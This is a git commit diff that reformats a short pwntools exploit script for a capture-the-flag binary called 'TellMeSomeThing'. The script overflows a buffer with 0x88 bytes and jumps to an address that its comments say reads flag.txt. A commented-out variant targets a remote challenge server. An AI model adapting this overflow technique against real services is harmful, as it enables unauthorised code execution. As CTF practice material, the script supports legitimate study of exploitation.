80906970f1accd39e6ce0627d44e6bf2ec7e71cf
CHU-YUN-FEI <45117488+CHU-YUN-FEI@users.noreply.github.com>
2019-07-11 23:33:31 +0800

    Update python.py

--- TellMeSomeThing/python.py
+++ TellMeSomeThing/python.py
@@ -1,1 +1,35 @@
-#!/usr/bin/env python# coding=utf-8# author:muhe# http://www.cnblogs.com/0xmuhe/from pwn import *################# p = process('./TellMeSomeThing.d3d5869bd6fb04dd35b29c67426c0f05')#新建一个flag.txt不然无回显junk = "A"*0x88		#rbp 长度addr1 = 0x400620   #read flag.txt函数地址 payload=""payload+=junkpayload+=p64(addr1)p.send(payload)#################'''p = remote('pwn.jarvisoj.com',9876)junk = "A"*0x88addr1 = 0x400620payload=""payload+=junkpayload+=p64(addr1)p.send(payload)'''#################p.interactive()
+#!/usr/bin/env python
+# coding=utf-8
+from pwn import *
+################# 
+p = process('./TellMeSomeThing.d3d5869bd6fb04dd35b29c67426c0f05')#新建一个flag.txt不然无回显
+junk = "A"*0x88		#rbp 长度
+addr1 = 0x400620   #read flag.txt函数地址 
+payload=""
+payload+=junk
+payload+=p64(addr1)
+p.send(payload)
+
+#################
+
+'''
+p = remote('pwn.jarvisoj.com',9876)
+junk = "A"*0x88
+addr1 = 0x400620
+payload=""
+payload+=junk
+payload+=p64(addr1)
+p.send(payload)
+'''
+
+
+#################
+
+
+
+
+
+
+
+
+p.interactive()
